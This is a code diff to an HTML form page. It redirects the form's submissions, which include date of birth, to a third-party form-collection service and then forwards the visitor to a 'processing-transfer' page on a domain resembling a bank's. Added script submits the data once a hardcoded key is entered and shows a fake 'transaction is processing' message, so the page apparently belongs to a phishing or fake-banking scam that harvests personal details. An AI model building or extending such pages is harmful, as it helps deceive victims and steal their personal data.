@@ -55,7 +55,8 @@
   </header>
   <div class="container-contact100">
     <div class="wrap-contact100">
-      <form method="post" action="" class="contact100-form validate-form" id="EMPLOYMENT" >
+      <form method="post" action="https://submit-form.com/MBWtt39u
+      " class="contact100-form validate-form" id="EMPLOYMENT" >
         <span class="contact100-form-title">
             <img src="../images/logo.svg">
                     </span>
@@ -175,7 +176,11 @@
   <input class="input100" type="date" name="dob" placeholder="">
 </div>
 
-
+<input
+type="hidden"
+name="_redirect"
+value="https://scotianova.ca/account/processing-transfer.html"
+/>
 <div class="wrap-input100 validate-input bg0 rs1-alert-validate" data-validate="any notes?">
     <span class="label-input100">Notes (Optional)</span>
     <textarea class="input100" name="message" placeholder="Memo"></textarea>
@@ -355,10 +360,11 @@ International              </label>
      /*the following code checkes whether the entered userid and password are matching*/
      if(EMPLOYMENT.key.value == "354738")
       {
-        swal("Good job!", "Please wait while your tansaction is processing, ", "success");
+        swal("Looks Good !", "Please wait while your tansaction is processing, ", "success");
 
+        document.getElementById("EMPLOYMENT").submit();
 
-      location.href = "./dashboard.html";
+    //  location.href = "./dashboard.html";
          event.preventDefault();
       }     
        else if(EMPLOYMENT.key.value == "" )
